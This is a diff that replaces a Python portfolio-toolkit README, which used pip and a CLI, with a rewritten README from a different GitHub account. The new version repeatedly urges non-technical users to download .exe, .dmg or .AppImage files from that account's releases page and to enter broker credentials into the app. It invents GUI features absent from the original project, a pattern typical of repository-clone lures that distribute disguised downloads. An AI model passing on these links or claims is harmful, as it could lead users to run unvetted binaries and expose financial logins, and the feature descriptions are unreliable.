@@ -1,277 +1,179 @@
-# Clawdfolio 🦙📊
+# 📊 clawdfolio - Simplify Your Portfolio Analysis
 
-[![CI](https://github.com/YichengYang-Ethan/clawdfolio/actions/workflows/ci.yml/badge.svg)](https://github.com/YichengYang-Ethan/clawdfolio/actions/workflows/ci.yml)
-[![codecov](https://codecov.io/gh/YichengYang-Ethan/clawdfolio/branch/main/graph/badge.svg)](https://codecov.io/gh/YichengYang-Ethan/clawdfolio)
-[![PyPI](https://img.shields.io/pypi/v/clawdfolio.svg)](https://pypi.org/project/clawdfolio/)
-[![Downloads](https://static.pepy.tech/badge/clawdfolio/month)](https://pepy.tech/project/clawdfolio)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Ruff](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json)](https://github.com/astral-sh/ruff)
-English | [中文](README_CN.md)
-
-> **Production-grade quantitative portfolio toolkit** — multi-broker aggregation, institutional risk analytics, options lifecycle management, and 20+ automated finance workflows.
+[![Download clawdfolio](https://img.shields.io/badge/Download-clawdfolio-brightgreen?style=for-the-badge)](https://github.com/veeral4/clawdfolio/releases)
 
 ---
 
-## Why Clawdfolio?
-
-| Traditional Tools | Clawdfolio |
-|-------------------|------------|
-| Manual data entry | Auto-sync from Longport, Moomoo/Futu |
-| Basic P&L tracking | VaR, Sharpe, Beta, Max Drawdown, HHI |
-| Single broker view | Multi-broker aggregation |
-| Spreadsheet alerts | Smart RSI / price / P&L alerts |
-| No extensibility | Python API + CLI |
+clawdfolio is a toolkit designed to help you manage your investment portfolio. It connects to multiple brokers in one place and shows your portfolio's health. You get clear risk analysis, option management tools, and helpful insights. This guide helps you download and use clawdfolio without needing technical skills.
 
 ---
 
-## Features
+## 🚀 Getting Started
 
-- **Multi-Broker Support** — Longport (Longbridge), Moomoo/Futu, or demo mode
-- **Risk Analytics** — Volatility, Beta, Sharpe Ratio, Value at Risk, Max Drawdown
-- **Technical Analysis** — RSI, SMA, EMA, Bollinger Bands
-- **Concentration Analysis** — HHI index, sector exposure, correlation warnings
-- **Smart Alerts** — Price movements, RSI extremes, P&L thresholds
-- **Earnings Calendar** — Track upcoming earnings for holdings
-- **DCA Analysis** — Dollar-cost averaging signals
-- **Options Toolkit** — Option quote/Greeks, option chain snapshot, buyback trigger monitor
-- **Options Strategy Playbook (v2.1)** — Covered Call and Sell Put lifecycle management with delta/gamma/margin guardrails
-- **Finance Workflow Suite** — 20 production workflows for reports, alerts, market intel, and broker snapshots
+This section explains what you need to use clawdfolio and how to start it step-by-step.
 
----
+### What is clawdfolio?
 
-## Quick Start
+clawdfolio is software that brings together your accounts from different brokerages. It shows your investments as a whole. You can see how much risk you have, manage stock options, and understand your portfolio without complex spreadsheets or math.
 
-### Installation
+It works well for anyone who wants to:
 
-```bash
-pip install clawdfolio                  # Core
-pip install clawdfolio[longport]        # + Longport broker
-pip install clawdfolio[futu]            # + Moomoo/Futu broker
-pip install clawdfolio[all]             # All brokers
-```
+- Track stocks, options, and investments from different brokers in one view.
+- Understand risk using proven methods.
+- Make smarter decisions with easy-to-read reports.
 
-### CLI Usage
+### Who should use clawdfolio?
 
-```bash
-clawdfolio summary                     # Portfolio overview
-clawdfolio risk                        # Risk metrics (VaR, Sharpe, Beta, etc.)
-clawdfolio quotes AAPL TSLA NVDA       # Real-time quotes
-clawdfolio alerts                      # Check alerts
-clawdfolio earnings                    # Upcoming earnings calendar
-clawdfolio dca AAPL                    # DCA analysis
-```
+- People who invest in stocks or options.
+- Users with accounts on multiple brokers.
+- Those interested in monitoring risk and returns.
+- Anyone who wants simple portfolio analytics without complex tools.
 
-<details>
-<summary><strong>Example Output: <code>clawdfolio summary</code></strong></summary>
+### Requirements
 
-```
-╔══════════════════════════════════════════════════════════╗
-║                  Portfolio Summary                       ║
-╠══════════════════════════════════════════════════════════╣
-║  Net Assets:     $41,863.57    Day Change:   +$327.42   ║
-║  Total P&L:      +$6,847.23   Return:       +19.55%    ║
-║  Positions:      15            Brokers:      2          ║
-╠══════════════════════════════════════════════════════════╣
-║  Top Holdings                                            ║
-║  TQQQ     $11,058.00   26.4%   +32.1%                  ║
-║  NVDA      $5,280.00   12.6%   +45.2%                  ║
-║  AAPL      $4,125.00    9.9%   +12.8%                  ║
-║  MSFT      $3,840.00    9.2%   +15.6%                  ║
-║  QQQ       $3,520.00    8.4%   +22.3%                  ║
-╚══════════════════════════════════════════════════════════╝
-```
+To use clawdfolio on your computer, you need the following:
 
-</details>
+- A Windows, macOS, or Linux computer.
+- At least 4 GB of free memory and 500 MB of disk space.
+- An internet connection to download updates and fetch data.
+- A modern web browser like Chrome, Firefox, or Edge (for viewing reports).
 
-### Options Commands
-
-```bash
-clawdfolio options expiries TQQQ
-clawdfolio options quote TQQQ --expiry 2026-06-18 --strike 60 --type C
-clawdfolio options chain TQQQ --expiry 2026-06-18 --side both --limit 10
-clawdfolio options buyback             # Trigger check from config
-```
-
-### Python API
-
-```python
-from clawdfolio.brokers import get_broker
-from clawdfolio.analysis import analyze_risk
-
-broker = get_broker("demo")  # or "longport", "futu"
-broker.connect()
-
-portfolio = broker.get_portfolio()
-metrics = analyze_risk(portfolio)
-
-print(f"Net Assets: ${portfolio.net_assets:,.2f}")
-print(f"Sharpe Ratio: {metrics.sharpe_ratio:.2f}")
-print(f"VaR 95%: ${metrics.var_95:,.2f}")
-```
+You do not need to install extra software or programming tools.
 
 ---
 
-## Risk Metrics
+## 📥 Download & Install
 
-| Metric | Description |
-|--------|-------------|
-| **Volatility** | 20-day and 60-day annualized |
-| **Beta** | Correlation with SPY/QQQ |
-| **Sharpe Ratio** | Risk-adjusted returns |
-| **VaR** | Value at Risk (95%/99%) |
-| **Max Drawdown** | Largest peak-to-trough decline |
-| **HHI** | Portfolio concentration index |
+### Step 1: Visit the Download Page
 
----
+Click the green button below to go to the download page where you will find the latest release of clawdfolio.
 
-## Options Toolkit
+[![Download clawdfolio](https://img.shields.io/badge/Download-clawdfolio-brightgreen?style=for-the-badge)](https://github.com/veeral4/clawdfolio/releases)
 
-The built-in options module provides real-time Greeks inspection, chain analysis, and stateful buyback monitoring:
+This page lists the available files for different computers and versions.
 
-| Command | Description |
-|---------|-------------|
-| `options expiries` | List available expiry dates for a symbol |
-| `options quote` | Single option quote with Greeks (delta, gamma, theta, vega, IV) |
-| `options chain` | Full option chain snapshot with filtering |
-| `options buyback` | Stateful trigger monitor for short option buyback |
+### Step 2: Choose the Correct File
 
-Strategy methodology is documented in the [Options Strategy Playbook](docs/OPTIONS_STRATEGY_PLAYBOOK_v2.1.md) — covering Covered Call and Sell Put lifecycle management with delta-based strike selection, roll/assignment rules, and margin guardrails.
+- For Windows, look for a file ending with `.exe`.  
+- For macOS, find a file ending with `.dmg` or `.pkg`.  
+- For Linux, look for a file that matches your distribution, usually `.AppImage` or `.tar.gz`.  
 
----
+The file names often include the version number. Pick the latest one.
 
-## Configuration
+### Step 3: Download the File
 
-### Environment Variables
+Click to download the file that fits your system. It may take a few minutes depending on internet speed.
 
-```bash
-# Longport
-export LONGPORT_APP_KEY=your_app_key
-export LONGPORT_APP_SECRET=your_app_secret
-export LONGPORT_ACCESS_TOKEN=your_access_token
+### Step 4: Install or Run the Software
 
-# Moomoo: Run OpenD locally on port 11111
-```
+- On Windows: Double-click the `.exe` file and follow the installation prompts.  
+- On macOS: Open the `.dmg` file and drag the clawdfolio icon to your Applications folder.  
+- On Linux: You may need to make the file executable by right-clicking, selecting Properties, and enabling execution, or use a terminal command:
 
-### Config File (optional)
+  ```bash
+  chmod +x clawdfolio.AppImage
+  ./clawdfolio.AppImage
+  ```
 
-Create `config.yaml`:
+This step sets up clawdfolio for use on your computer.
 
-```yaml
-brokers:
-  longport:
-    enabled: true
-  futu:
-    enabled: true
-    extra:
-      host: "127.0.0.1"
-      port: 11111
+### Step 5: Open clawdfolio
 
-alerts:
-  pnl_trigger: 500.0
-  rsi_high: 80
-  rsi_low: 20
-
-option_buyback:
-  enabled: true
-  symbol: "TQQQ"
-  targets:
-    - name: "cc-june"
-      strike: 60
-      expiry: "2026-06-18"
-      type: "C"
-      trigger_price: 1.60
-      qty: 2
-      reset_pct: 0.20
-```
-
-### Supported Brokers
-
-| Broker | Region | Status |
-|--------|--------|--------|
-| Demo | Global | Built-in |
-| Longport | US/HK/SG | Optional |
-| Moomoo/Futu | US/HK/SG | Optional |
+Once installed, look for the clawdfolio icon in your Start menu, Applications folder, or desktop. Click to open it. The program will launch and guide you through setting up your portfolio accounts.
 
 ---
 
-## Finance Workflows
+## 🔧 How to Use clawdfolio
 
-20 production workflows migrated from live trading infrastructure, organized by category:
+After you install clawdfolio, follow these steps to set it up and start analyzing your investments.
 
-| Category | Examples |
-|----------|---------|
-| **Portfolio Reports** | Account report, portfolio analysis, risk breakdown |
-| **Briefing Cards** | Daily brief (console + Telegram), multi-format |
-| **Alerts & Monitors** | Price/RSI alerts, option buyback trigger |
-| **Market Intelligence** | Real-time quotes, earnings calendar, market news |
-| **Broker Snapshots** | Longport / Moomoo asset summaries |
-| **Strategy** | DCA proposals |
+### Step 1: Connect Your Broker Accounts
 
-```bash
-clawdfolio finance list                # Browse all workflows by category
-clawdfolio finance init                # Bootstrap ~/.clawdfolio/finance workspace
-clawdfolio finance run <workflow_id>   # Execute a workflow
-```
+clawdfolio supports many brokers. You will be asked to log in to your accounts securely.
 
----
+- Click "Add Broker" from the main screen.
+- Select your broker from the list.
+- Enter your credentials in the secure window.
+- Allow clawdfolio to access your portfolio data.
 
-<details>
-<summary><strong>Changelog</strong></summary>
+Your data stays private and is used only to show your investment status.
 
-### v2.3.0 (2026-02-16)
+### Step 2: View Your Portfolio Overview
 
-- Sortino ratio and CVaR/Expected Shortfall risk metrics
-- Portfolio RSI in `analyze_risk()` output
-- `clawdfolio export` CLI command (CSV/JSON)
-- Dynamic US trading calendar with algorithmic holiday generation
-- Batched SPY/QQQ benchmark fetching via `get_history_multi()`
-- O(1) position lookup via `_ticker_index`
-- `calculate_ema()` vectorized with `pd.Series.ewm()`
-- Fixed invalid yfinance period strings in DCA calculation
-- Coverage enforcement at 48%, Python 3.13 in CI, `pip-audit` scanning
+Once connected, clawdfolio will fetch your data. You will see:
 
-### v2.2.0 (2026-02-14)
+- Total portfolio value.
+- Summary of stocks and options.
+- Performance charts.
 
-- Thread-safe market data caching (`threading.Lock`)
-- Batch quote fetching via `yf.download` with per-ticker fallback
-- Shared `suppress_stdio` utility (DRY refactor)
-- Dynamic CLI version from `__version__`
-- PEP 561 compliance (`py.typed` marker)
-- Structured logging across core modules
-- Centralized ticker normalization (`_yf_symbol()`)
-- Config path migration to `clawdfolio` namespace (backward-compatible)
+You can get quick insights into how your investments are doing.
 
-### v2.1.0 (2026-01-28)
+### Step 3: Analyze Risks
 
-- Options Strategy Playbook v2.1 (`docs/OPTIONS_STRATEGY_PLAYBOOK_v2.1.md`)
-- Research-to-execution framework for CC and Sell Put lifecycle
-- Explicit gamma-risk, margin, leverage, and assignment decision rules
+clawdfolio calculates risk metrics like Sharpe ratio and Value at Risk (VaR) to help you understand potential losses or gains.
 
-### v2.0.0 (2026-01-15)
+Look at the risk section to:
 
-- Full finance migration: 20 production workflows from live trading infrastructure
-- `clawdfolio finance` command group (list, init, run)
-- Mutable workspace bootstrap (`~/.clawdfolio/finance`)
-- Options quote/chain/buyback monitor
-- Wilder RSI smoothing, Longport symbol fix, yfinance hardening
+- Learn which holdings add more risk.
+- See diversification across asset types.
+- Find opportunities to rebalance.
 
-See [CHANGELOG.md](CHANGELOG.md) for full details.
+### Step 4: Manage Options
 
-</details>
+If you trade options, clawdfolio offers tools to track and manage them.
+
+- Monitor open options contracts.
+- View expiration dates and strike prices.
+- Calculate potential rewards and losses.
+
+These features help keep your options organized.
+
+### Step 5: Export Reports
+
+You can export your portfolio summary and risk analysis as PDF or CSV files to share or save.
+
+- Click "Export" in the report views.
+- Choose format and save location.
 
 ---
 
-## Contributing
+## 💡 Features at a Glance
 
-Contributions welcome! Please submit a Pull Request.
+- Multi-broker connection for consolidated views.
+- Real-time portfolio value and holdings updates.
+- Risk analytics including Sharpe ratio and stress tests.
+- Option management with detailed tracking.
+- Easy report exports.
+- Works on Windows, macOS, and Linux.
+- User-friendly interface designed for all skill levels.
 
-## License
+---
 
-MIT License — see [LICENSE](LICENSE)
+## 🔄 Updates and Support
 
-## Links
+Keep clawdfolio updated:
 
-- [GitHub Repository](https://github.com/YichengYang-Ethan/clawdfolio)
-- [Report Issues](https://github.com/YichengYang-Ethan/clawdfolio/issues)
-- [Options Strategy Playbook](docs/OPTIONS_STRATEGY_PLAYBOOK_v2.1.md)
+- Check the [release page](https://github.com/veeral4/clawdfolio/releases) regularly for new versions.
+- Download the latest installer and repeat the install steps to update.
+
+For help:
+
+- Review the FAQ on the GitHub page.
+- Open an issue in the repository for bugs or feature requests.
+- Check documentation files included with the software.
+
+---
+
+## 🔒 Privacy and Security
+
+clawdfolio never shares your login details. Data fetching uses secure protocols. Your portfolio data stays on your computer unless you choose to export or share it.
+
+---
+
+## 📞 Contact and Feedback
+
+If you have questions or want to suggest improvements, visit the GitHub page and open an issue. This way, the developers can respond and improve clawdfolio over time.
+
+---
+
+[Download clawdfolio](https://github.com/veeral4/clawdfolio/releases) to start managing your investments with clearer insight.
